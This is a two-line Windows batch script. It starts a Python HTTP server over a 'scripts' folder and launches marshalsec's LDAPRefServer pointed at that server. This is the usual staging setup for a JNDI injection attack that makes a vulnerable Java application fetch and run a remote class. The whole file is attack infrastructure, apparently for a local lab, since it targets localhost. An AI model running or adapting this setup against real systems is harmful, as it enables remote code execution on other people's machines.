start cmd /K "cd scripts && ..\Python310\python.exe -m http.server"
start cmd /K "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#"